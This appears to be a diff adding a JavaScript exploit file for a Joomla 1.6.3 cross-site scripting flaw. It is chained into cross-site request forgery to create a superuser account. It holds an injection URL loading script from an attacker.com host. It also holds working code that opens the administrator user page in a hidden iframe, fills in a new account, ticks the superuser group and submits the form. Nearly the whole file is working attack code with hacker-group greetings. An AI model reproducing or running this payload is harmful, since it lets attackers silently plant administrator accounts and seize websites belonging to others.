@@ -1,0 +1,28 @@
+This vulnerability takes advantage of the recent Joomla 1.6.3 XSS vulnerability ( http://seclists.org/fulldisclosure/2011/Jun/519 ) to execute a CSRF vulnerability to create a superuser account. 
+?
+/*
+joom163.js
+Joomla 1.6.3 XSS -> CSRF Exploit
+Greetz to Shardy, Xires & Stacy, Rage, coorslitedude, Nothingness, MaXe
+Coded By: Connection
+
+Vuln Link: index.php?option=com_contact&view=category&catid=26&id=36&Itemid=-1";'>"><script src=http://attacker.com/joom163.js></script>
+
+*/
+document.writeln('<iframe id="iframe" src="http://victim.com/administrator/index.php?option=com_users&view=user&layout=edit" width="0" height="0" style="visibility:hidden;" onload="read()"></iframe>');
+
+function read()
+{
+var name="Test";
+var username="haxx";
+var password="test123";
+var email="fake _at_ gmail.com";
+
+document.getElementById("iframe").contentDocument.forms[0].jform_name.value = name;
+document.getElementById("iframe").contentDocument.forms[0].jform_username.value = username;
+document.getElementById("iframe").contentDocument.forms[0].jform_password.value = password;
+document.getElementById("iframe").contentDocument.forms[0].jform_password2.value = password;
+document.getElementById("iframe").contentDocument.forms[0].jform_email.value = email;
+document.getElementById("iframe").contentDocument.forms[0].getElementById("1group_8").checked=true;
+document.getElementById("iframe").contentDocument.getElementsByTagName("a")[11].onclick();
+}
